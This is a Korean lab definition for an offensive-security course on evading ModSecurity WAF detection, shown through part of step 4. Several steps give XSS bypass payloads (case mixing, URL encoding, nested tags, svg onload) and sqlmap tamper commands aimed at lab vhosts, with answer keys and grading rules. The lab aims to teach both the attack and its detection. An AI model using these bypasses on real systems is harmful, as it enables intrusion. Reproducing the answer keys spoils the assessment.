lab_id: standalone-attack-week10
title: IDS / WAF 우회 (Evasion) — DetectionOnly 우회 + tamper + R/B/P
version: standalone-non-ai
course: attack
week: 10
description: |
  방어 측 detection (ModSec CRS + libinjection + Suricata + Wazuh) 의 우회 기술.
  6v6 의 web 은 vhost 별로 ModSec mode 가 다르다 — juice.6v6.lab 은 DetectionOnly
  (탐지만, 차단 안 함), dvwa.6v6.lab 은 On (차단). 학생은 (1) 같은 XSS/SQLi 변형이
  mode 에 따라 200 통과(juice) vs 403 차단(dvwa)되는 것을 관찰하고, (2) DetectionOnly
  의 "우회 성공(200)" 이 실은 ModSec 가 탐지(error.log)하고 있음을 발견하고, (3) Blue
  관점에서 DetectionOnly 탐지(error.log) / On 차단(audit log) / Suricata / Wazuh 의
  서로 다른 탐지 위치를 cross-check 한 뒤, (4) Purple 관점에서 DetectionOnly→On 전환
  을 포함한 방어 강화를 설계한다. 마지막 3 step 은 R/B/P 통합. **윤리적 한계**: 6v6
  환경 안에서만, 학습 목적만. 외부 시스템 우회 = 정통망법 48조 위반.
difficulty: hard
duration_minutes: 180
audience: 사이버공격 (10주차)
prerequisites: ["W09 패스워드 공격"]
objectives:
  - "6 우회 카테고리 — encoding / case / nested / fragmentation / timing / protocol"
  - "ModSec mode 차이 — DetectionOnly(200 통과+탐지) vs On(403 차단)"
  - "sqlmap --tamper 스크립트 + 변형 메커니즘"
  - "WAF 식별 (wafw00f 한계 + 수동 fingerprint)"
  - "Blue — DetectionOnly 탐지(error.log) / On 차단(audit log) / Suricata / Wazuh"
  - "Purple — Coverage Matrix + Detection Gap + DetectionOnly→On 전환 + 방어 5표준"
pass_threshold: 0.6
steps:

  - order: 1
    instruction: |
      ## 🎯 MISSION (Red Team — juice 우회 매트릭스)

      XSS payload **5 우회 변형** 을 web (10.20.30.1, Host: juice.6v6.lab) 에 보내고
      각 변형의 **응답 코드** 와 **우회 의도** 를 매트릭스로 정리하라. juice vhost 는
      ModSec **DetectionOnly** 모드이므로 결과를 보고 "우회 성공" 의 의미를 STEP 5 와
      연결해 해석한다.

      ## 💡 5 변형의 우회 의도 (학습 핵심)

      | # | payload | 우회 기법 | 깨려는 가정 |
      |---|---------|-----------|-------------|
      | 1 | `<script>alert(1)</script>` | baseline | (대조군) |
      | 2 | `<ScRiPt>alert(1)</ScRiPt>` | case mixing | regex 가 대소문자 구분한다 |
      | 3 | `%3Cscript%3Ealert(1)%3C/script%3E` | URL encoding | WAF 가 decode 전에 매칭한다 |
      | 4 | `<sc<script>ript>alert(1)</script>` | nested tag | filter 가 내부 `<script>` 만 제거한다 |
      | 5 | `<svg/onload=alert(1)>` | event handler | `<script>` 키워드만 차단한다 |

      ## 💻 실행 명령

      ```bash
      ssh 6v6-attacker '
      for p in "<script>alert(1)</script>" "<ScRiPt>alert(1)</ScRiPt>" "%3Cscript%3Ealert(1)%3C/script%3E" "<sc<script>ript>alert(1)</script>" "<svg/onload=alert(1)>"; do
        code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=$p")
        echo "$code | $p"
      done
      '
      ATTACK_TS=$(ssh 6v6-attacker 'date -u +%Y-%m-%dT%H:%M:%S'); echo "ATTACK_TS=$ATTACK_TS"
      ```

      ## 📋 확인 사항

      - 5 변형의 응답 코드 매트릭스 (juice 는 DetectionOnly → 모두 200 통과)
      - "200 통과 = 우회 성공처럼 보임" — 그러나 STEP 5 에서 ModSec 가 탐지함을 확인
      - ATTACK_TS 기록 (Blue 측 시간 상관용)

      ## 💡 왜 이걸 하는가?

      Red Team — WAF 우회 패턴 학습. juice 가 DetectionOnly 라 5 변형 모두 200 으로
      통과한다. 이것은 "차단되지 않았다" 는 사실일 뿐, "탐지되지 않았다" 는 의미가
      아니다 — DetectionOnly 는 차단 없이 룰 매치를 로그(error.log)에 남긴다. 이 차이를
      이해하는 것이 우회 실습의 핵심이다.

      ## 🔍 결과 해석

      - **모두 200 (juice DetectionOnly)**: 차단은 안 됐지만 ModSec 탐지는 동작 (STEP 5)
      - **403 이 섞이면**: 해당 vhost 가 On 모드이거나 별도 차단 룰
      - **모두 200 + error.log 무흔적**: ModSec 비활성 의심 → `ssh 6v6-web 'sudo apachectl -M | grep security2'`

      ## ⚠️ 비정상 시 대응

      - Host 헤더 없이 보내면 default vhost(On)로 403 — 반드시 `-H "Host: juice.6v6.lab"`
      - 연결 실패 — `ssh 6v6-attacker 'curl -s -o /dev/null -w "%{http_code}" -H "Host: juice.6v6.lab" http://10.20.30.1/'` (정상 200 확인)
    hint: |
      juice(DetectionOnly) XSS 5변형 → 모두 200 통과. "통과 ≠ 미탐지" — DetectionOnly
      는 차단 안 해도 error.log 에 탐지 기록(STEP 5). Host 헤더 필수.
    category: bypass
    points: 12
    answer: |
      ssh -n 6v6-attacker '
      for p in "<script>alert(1)</script>" "<ScRiPt>alert(1)</ScRiPt>" "%3Cscript%3Ealert(1)%3C/script%3E" "<sc<script>ript>alert(1)</script>" "<svg/onload=alert(1)>"; do
        code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=$p")
        echo "$code | $p"
      done
      '
      ATTACK_TS=$(ssh -n 6v6-attacker 'date -u +%Y-%m-%dT%H:%M:%S'); echo "ATTACK_TS=$ATTACK_TS"
    answer_detail: |
      juice 는 DetectionOnly → XSS 5변형 모두 200 통과. baseline/case/url-enc/nested/svg
      가 모두 차단 없이 응답. 그러나 ModSec 룰(941100 등)은 매치되어 juice_error.log 에
      기록됨(STEP 5). "200 통과" 를 "우회 성공" 으로 단정하면 안 되고, 탐지 여부를 별도
      확인해야 한다는 것이 핵심 교훈.
    verify:
      type: output_contains
      expect: '200'
      field: stdout
      semantic:
        intent: Red — juice(DetectionOnly) XSS 5 우회 변형 매트릭스 + 통과≠미탐지.
        success_criteria: ["5 변형 시도", "응답 코드(200)", "ATTACK_TS"]
        acceptable_methods:
          - |
            **[OSS] curl 우회 매트릭스** — 표준.
              ssh 6v6-attacker 'for p in ...; do curl -s -o /dev/null -w "%{http_code}" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=$p"; done'
            예상 출력 `200 x5` (juice DetectionOnly).
            운영 해석: 통과해도 STEP 5 에서 탐지 확인 필요.
          - |
            **[OSS] case / URL encoding / nested / svg 변형** — 우회 기법.
            예상 출력 `200` (DetectionOnly 통과).
            운영 해석: 각 변형이 어떤 방어 가정을 노리는지 인지.
          - "**[OSS] ATTACK_TS 기록** — Blue 시간 상관용 UTC timestamp."
        negative_signs: ["변형 1~2개만", "ATTACK_TS 누락", "통과를 미탐지로 단정"]
    target_vm: attacker
    risk_level: medium

  - order: 2
    instruction: |
      ## 🎯 MISSION (Red Team — On 모드 대조)

      STEP 1 과 **동일한 XSS payload** 를 이번에는 dvwa.6v6.lab (ModSec **On** 모드)
      에 보내고 응답 코드를 비교하라. 같은 공격이 vhost mode 에 따라 어떻게 다르게
      처리되는지 정량화한다.

      ## 💻 실행 명령

      ```bash
      ssh 6v6-attacker '
      echo "=== juice (DetectionOnly) vs dvwa (On) ==="
      for host in juice.6v6.lab dvwa.6v6.lab; do
        for p in "<script>alert(1)</script>" "<svg/onload=alert(1)>"; do
          code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: $host" "http://10.20.30.1/?q=$p")
          echo "$host | $code | $p"
        done
      done
      '
      ```

      ## 📋 확인 사항

      - juice: 200 (DetectionOnly, 통과)
      - dvwa: 403 (On, 차단)
      - 동일 payload, mode 차이로 결과 정반대

      ## 💡 왜 이걸 하는가?

      ModSec 의 `SecRuleEngine` 은 vhost 별로 On(차단) / DetectionOnly(탐지만) / Off
      로 설정된다. 운영 현장에서는 false-positive 검증 기간 동안 DetectionOnly 로
      두었다가 On 으로 전환한다. 공격자 관점에서는 같은 페이로드가 어떤 vhost 는
      통과(200), 어떤 vhost 는 차단(403)되므로 mode 식별이 중요하다.

      ## 🔍 결과 해석

      - juice 200 + dvwa 403 = mode 차이 확인 → DetectionOnly vhost 가 차단 사각지대
      - 둘 다 403 = 둘 다 On / 둘 다 200 = 둘 다 DetectionOnly 또는 Off

      ## ⚠️ 비정상 시 대응

      - dvwa 가 302 — DVWA 로그인 redirect (정상). `/?q=` 대신 `/vulnerabilities/xss_r/?name=` 등 endpoint 시도
      - mode 확인 — `ssh 6v6-web 'sudo grep -rh SecRuleEngine /etc/apache2/ /etc/modsecurity/ 2>/dev/null | grep -v "#" | sort | uniq -c'`
    hint: |
      동일 XSS 를 juice(DetectionOnly→200) vs dvwa(On→403) 대조. mode 차이로 같은
      공격이 통과/차단. SecRuleEngine vhost별 설정 이해.
    category: bypass
    points: 10
    answer: |
      ssh -n 6v6-attacker '
      for host in juice.6v6.lab dvwa.6v6.lab; do
        for p in "<script>alert(1)</script>" "<svg/onload=alert(1)>"; do
          code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: $host" "http://10.20.30.1/?q=$p")
          echo "$host | $code | $p"
        done
      done
      '
    answer_detail: |
      juice(DetectionOnly) → 200 통과, dvwa(On) → 403 차단. 동일 XSS payload 가 vhost
      의 SecRuleEngine mode 에 따라 정반대 결과. DetectionOnly 는 탐지만 하고 통과시키므로
      차단 사각지대. 운영에서는 FP 검증 후 On 전환이 표준 (Purple STEP 9 권고).
    verify:
      type: output_contains
      expect: '403'
      field: stdout
      semantic:
        intent: Red — DetectionOnly(juice) vs On(dvwa) mode 대조.
        success_criteria: ["juice 200", "dvwa 403", "mode 차이 인지"]
        acceptable_methods:
          - |
            **[OSS] curl 양 vhost 대조** — mode 비교.
              ssh 6v6-attacker 'for host in juice.6v6.lab dvwa.6v6.lab; do curl ... -H "Host: $host" ...; done'
            예상 출력 `juice 200 / dvwa 403`.
            운영 해석: 같은 공격, mode 차이로 통과/차단.
          - |
            **[OSS] SecRuleEngine vhost 확인** — mode 식별.
              ssh 6v6-web 'sudo grep -rh SecRuleEngine /etc/apache2/sites-enabled/'
            예상 출력 `juice DetectionOnly / dvwa On`.
            운영 해석: vhost별 차단 정책.
        negative_signs: ["대조 없이 한 vhost 만", "mode 차이 결론 누락"]
    target_vm: attacker
    risk_level: medium

  - order: 3
    instruction: |
      ## 🎯 MISSION (Red Team — SQLi 우회 + sqlmap tamper)

      sqlmap **--tamper** 3 스크립트를 web 에 시도하고 각 tamper 의 변형 메커니즘과
      결과를 정리하라. dvwa(On) 대상으로 차단 여부를, 942(SQLi) 룰 매치를 확인한다.

      ## 💡 3 tamper 의 변형 메커니즘 (학습 핵심)

      | tamper | 입력 → 변형 | 우회 의도 |
      |--------|-------------|-----------|
      | `space2comment` | `UNION SELECT` → `UNION/**/SELECT` | 공백 매칭 룰 회피 |
      | `randomcase` | `SELECT` → `SeLeCt` | regex `(?i)` 누락 룰 회피 |
      | `between` | `id=1` → `id BETWEEN 0 AND 2` | `=` 키워드 매칭 회피 |

      ## 💻 실행 명령

      ```bash
      ssh 6v6-attacker '
      for tamper in space2comment randomcase between; do
        echo "=== $tamper ==="
        timeout 35 sqlmap -u "http://10.20.30.1/?q=1" --batch --tamper=$tamper --headers="Host: dvwa.6v6.lab" --threads=1 2>&1 | grep -iE "vulnerable|all tested|ending|403|forbidden" | head -4
      done
      '
      # ModSec 942(SQLi) 매치 카운트 — audit log 는 Serial 형식이라 grep 사용
      ssh 6v6-web 'sudo grep -c "942" /var/log/apache2/modsec_audit.log 2>/dev/null'
      ```

      ## 📋 확인 사항

      - 3 tamper 모두 실행 + ending 출력
      - dvwa(On) 대상이라 ModSec 가 403 차단 → "not injectable"
      - 942 매치 카운트 (tamper 시도가 SQLi 룰 매치)

      ## 💡 왜 이걸 하는가?

      sqlmap --tamper 는 WAF 우회의 표준 도구. 각 tamper 의 *변형 메커니즘* 을 인지하면
      custom tamper 작성의 토대가 된다. juice `/?q=` 는 SPA route 라 SQL endpoint 가
      없고, dvwa(On) 은 ModSec 가 403 차단한다.

      ## 🔍 결과 해석

      - **403 다수 + not injectable**: ModSec(On) 이 sqlmap 시도를 모두 차단 (예상)
      - **942 카운트 증가**: tamper payload 가 942(SQLi) 룰 매치
      - **vulnerable 발견 시**: 즉시 강사 보고 (책임 있는 공개)

      ## ⚠️ 비정상 시 대응

      - timeout 35 초과 — `--threads=1 --delay=1` 추가
      - 942 카운트 0 — `ssh 6v6-web 'sudo find /var/log -name "modsec_audit*"'`
    hint: |
      sqlmap --tamper 3(space2comment/randomcase/between) + 각 메커니즘 + 942 grep
      카운트. dvwa(On) 차단으로 not injectable 이 정상. audit log 는 Serial → grep.
    category: bypass
    points: 12
    answer: |
      ssh -n 6v6-attacker '
      for tamper in space2comment randomcase between; do
        echo "=== $tamper ==="
        timeout 35 sqlmap -u "http://10.20.30.1/?q=1" --batch --tamper=$tamper --headers="Host: dvwa.6v6.lab" --threads=1 2>&1 | grep -iE "vulnerable|all tested|ending|403|forbidden" | head -4
      done
      '
      ssh -n 6v6-web 'sudo grep -c "942" /var/log/apache2/modsec_audit.log 2>/dev/null'
    answer_detail: |
      3 tamper × sqlmap. dvwa(On) 대상이라 ModSec 가 403 차단 → "all tested parameters
      do not appear to be injectable". 942 카운트는 tamper payload 가 942(SQLi) 룰
      매치하며 증가. audit log 는 Serial(Native) format 이라 jq 아닌 grep '942'.
    verify:
      type: output_contains
      expect: ending
      field: stdout
      semantic:
        intent: Red — sqlmap tamper 3 + 변형 메커니즘 + 942 매치.
        success_criteria: ["3 tamper 실행", "ending 출력", "942 카운트"]
        acceptable_methods:
          - |
            **[OSS] sqlmap --tamper** — 표준 WAF 우회.
              ssh 6v6-attacker 'sqlmap -u ... --tamper=space2comment --headers="Host: dvwa.6v6.lab" --batch'
            예상 출력 `403 + not injectable + ending`.
            운영 해석: dvwa(On) 차단 → SQLi 불가, 942 매치.
          - |
            **[OSS] space2comment / randomcase / between** — 변형 기법.
            예상 출력 `403` (CRS 942 매치).
            운영 해석: libinjection 은 SQL 토큰 분석이라 우회 어려움.
          - |
            **[OSS] grep 942 카운트** — Serial audit log.
              ssh 6v6-web 'sudo grep -c "942" /var/log/apache2/modsec_audit.log'
            예상 출력 `숫자`.
            운영 해석: tamper 시도가 942(SQLi) 룰 매치.
        negative_signs: ["tamper 1개만", "ending 없음", "jq 로 942 시도(Serial 인데)"]
    target_vm: attacker
    risk_level: medium

  - order: 4
    instruction: |
      ## 🎯 MISSION (Red Team — WAF 식별)

      대상 web 의 WAF 를 식별하라. 자동 도구(wafw00f) 결과와 수동 fingerprint(mode 별
      응답 차이 + Server 헤더)를 비교하여 어느 쪽이 신뢰성 있는지 판정한다.

      ## 💻 실행 명령

      ```bash
      # wafw00f 는 hostname resolve 필요 → /etc/hosts 에 vhost 추가 (없으면)
      ssh 6v6-attacker 'grep -q juice.6v6.lab /etc/hosts || sudo sh -c "echo 10.20.30.1 juice.6v6.lab dvwa.6v6.lab >> /etc/hosts"'
      # 자동 식별
      ssh 6v6-attacker 'wafw00f "http://juice.6v6.lab/" 2>&1 | grep -iE "behind|No WAF|detected|requests"'
      # 수동 fingerprint — juice(DetectionOnly,200) vs dvwa(On,403) + Server 헤더
      ssh 6v6-attacker '
      echo "juice 정상:"; curl -s -o /dev/null -w "%{http_code}" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=hello"; echo
      echo "juice 공격:"; curl -s -o /dev/null -w "%{http_code}" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=<script>alert(1)</script>"; echo
      echo "dvwa 공격:"; curl -s -o /dev/null -w "%{http_code}" -H "Host: dvwa.6v6.lab" "http://10.20.30.1/?q=<script>alert(1)</script>"; echo
      echo "Server:"; curl -sI -H "Host: juice.6v6.lab" "http://10.20.30.1/" | grep -i server
      '
      ```

      ## 📋 확인 사항

      - wafw00f 결과 (이 환경: "No WAF detected" — ModSec stealth)
      - 수동 fingerprint: juice 정상/공격 모두 200(DetectionOnly), dvwa 공격 403(On)
      - Server 헤더 (Apache)

      ## 💡 왜 이걸 하는가?

      wafw00f 는 응답 시그니처로 WAF 를 식별하는데, ModSec 는 기본 stealth 라 generic
      detection 을 회피한다. 또한 juice 가 DetectionOnly 라 공격도 200 으로 통과시켜
      "응답 코드 차이" 만으로는 WAF 를 못 본다. dvwa(On)에서 403 이 나야 비로소 WAF
      존재가 드러난다. 즉 mode 를 가로질러 fingerprint 해야 정확하다.

      ## 🔍 결과 해석

      - **wafw00f "No WAF detected"**: stealth ModSec → 자동 식별 회피 (도구 한계)
